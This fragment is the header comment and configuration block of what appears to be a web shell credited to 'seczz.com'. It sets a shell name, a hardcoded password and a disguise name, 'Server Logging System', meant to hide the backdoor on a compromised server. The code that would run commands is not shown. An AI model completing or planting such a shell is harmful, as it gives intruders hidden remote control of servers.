...
// ^^^^^^^^^^^^
// author: seczz.com
// greets: seczz.com(s) and all of you who love peace and freedom
//
//
// ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
// Jayalah Indonesiaku
...
//################ VARIABLES GOES HERE #######################=============================================]
String shell_name = "seczz.com";
String shell_fake_name = "seczz.com Server Logging System";
String shell_title = " :: " + shell_name + " ::";
String shell_version = "v1";
String shell_password = "yl";
